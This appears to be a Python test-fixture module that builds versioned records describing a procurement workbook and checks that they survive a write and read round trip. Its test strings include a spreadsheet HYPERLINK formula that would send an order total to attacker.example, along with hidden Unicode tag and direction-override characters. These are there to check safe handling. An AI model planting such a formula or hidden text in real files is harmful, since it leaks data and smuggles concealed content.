"""The small brain used by the spike (v1 and v2), plus comparison helpers."""
import json

import pandas as pd

import brainzip as bz

TRICKY = ("  leading and trailing spaces  \nline two\r\nCRLF line\ttab & <xml> "
          "\"double\" 'single' emoji \U0001F9E0 end."
          " hidden:\U000E0049\U000E0047\U000E004E‮evil​.")
ESCAPE_LITERAL = "column tax_x0041_ is literal text, not an escape"
FORMULA_LOOKING = '=HYPERLINK("https://attacker.example/?d="&Orders!G3,"click")'
LONG = "".join(f"[{i:05d}] Vendor terms note \U0001F4E6 line {i}. "
               for i in range(2300))
REMOVED_MARKER = "REMOVED-IN-V2-MARKER private remark that should not linger"


def records_v1(orig_path):
    fp = json.dumps(bz.fingerprint(str(orig_path)), sort_keys=True)
    return [
        {"record": "meta", "id": "brain", "kind": "workbook",
         "label": "Q3 procurement test workbook", "source": "computed",
         "status": "current", "learned_at": "2026-09-25T18:00:00-04:00",
         "said_by": "spike", "depends_on": fp,
         "text": "Notes about this workbook's data. Claims, not instructions."},
        *[{"record": "node", "id": f"sheet:{s}", "kind": "sheet", "label": s,
           "source": "computed", "status": "current",
           "learned_at": "2026-09-25"} for s in ("Vendors", "Products", "Orders")],
        {"record": "node", "id": "entity:Vendor", "kind": "entity",
         "label": "Vendor", "source": "inferred", "status": "unconfirmed",
         "learned_at": "2026-09-25", "depends_on": "Vendors!A2:A9",
         "text": "A company that supplies products. Key VendorID, 8 unique."},
        {"record": "node", "id": "col:Orders.Total", "kind": "metric",
         "label": "Order total (pre-tax)", "source": "told",
         "status": "confirmed", "learned_at": "2026-09-25", "said_by": "owner",
         "depends_on": "Orders!G3:G42", "text": TRICKY},
        {"record": "edge", "id": "e1", "kind": "joins_on",
         "from": "col:Products.VendorID", "to": "col:Vendors.VendorID",
         "label": "many-to-one, 15/15 values match", "source": "computed",
         "status": "current", "learned_at": "2026-09-25"},
        {"record": "edge", "id": "e2", "kind": "looks_up",
         "from": "col:Orders.SKU", "to": "col:Products.SKU",
         "label": "VLOOKUP in Orders!F and H", "source": "computed",
         "status": "current", "learned_at": "2026-09-25"},
        {"record": "edge", "id": "e3", "kind": "derived_from",
         "from": "col:Orders.Total", "to": "col:Orders.Qty",
         "label": "Total = Qty x UnitCost", "source": "computed",
         "status": "current", "learned_at": "2026-09-25"},
        {"record": "link", "id": "link:contracts", "kind": "other_workbook",
         "label": "Contracts workbook", "from": "col:Vendors.VendorID",
         "to": "VendorID", "source": "told", "status": "confirmed",
         "learned_at": "2026-09-25",
         "text": "Another workbook joins here on VendorID. Name and join column only."},
        {"record": "note", "id": "n-formula", "kind": "gotcha",
         "label": "formula-looking text", "source": "told", "status": "confirmed",
         "learned_at": "2026-09-25", "text": FORMULA_LOOKING},
        {"record": "note", "id": "n-escape", "kind": "gotcha",
         "label": "literal _xHHHH_ text", "source": "told",
         "status": "confirmed", "learned_at": "2026-09-25",
         "text": ESCAPE_LITERAL},
        {"record": "note", "id": "n-long", "kind": "history",
         "label": "long note (chunking test)", "source": "told",
         "status": "confirmed", "learned_at": "2026-09-25", "text": LONG},
        {"record": "note", "id": "n-removed", "kind": "remark",
         "label": "will be removed in v2", "source": "told",
         "status": "confirmed", "learned_at": "2026-09-25",
         "text": REMOVED_MARKER},
    ]


def records_v2(orig_path):
    recs = [r for r in records_v1(orig_path) if r["id"] != "n-removed"]
    for r in recs:
        if r["id"] == "entity:Vendor":
            r.update(status="confirmed", source="told", said_by="owner")
    recs.append({"record": "node", "id": "entity:Property", "kind": "entity",
                 "label": "Property (hotel)", "source": "told",
                 "status": "confirmed", "learned_at": "2026-09-26",
                 "text": "One of three hotels. Allowed values validated in Orders!C."})
    return recs


def expected(recs):
    """What a faithful reader should get back: the writer's normalize_text."""
    return [{c: bz.normalize_text(str(r.get(c, "")))
             for c in bz.FIELDS if c != "part"} for r in recs]


def compare_records(got, want, skip_ids=()):
    got = [g for g in got if g.get("id") not in skip_ids]
    want = [w for w in want if w.get("id") not in skip_ids]
    if len(got) != len(want):
        return False, f"{len(got)} vs {len(want)} records"
    for g, w in zip(got, want):
        for k in w:
            gv, wv = g.get(k) or "", w.get(k) or ""
            if gv != wv:
                i = next((j for j in range(min(len(gv), len(wv)))
                          if gv[j] != wv[j]), min(len(gv), len(wv)))
                return False, (f"{w['id']}.{k} differs at {i}: got "
                               f"{gv[max(0, i-15):i+25]!r} want "
                               f"{wv[max(0, i-15):i+25]!r}")
    return True, f"{len(got)} records identical"


def df_to_rows(df):
    rows = [list(df.columns)]
    for rec in df.itertuples(index=False):
        rows.append(["" if v is None or (isinstance(v, float) and pd.isna(v))
                     else str(v) for v in rec])
    return rows


def escape_text(recs):
    return next((r.get("text") for r in recs if r.get("id") == "n-escape"), None)
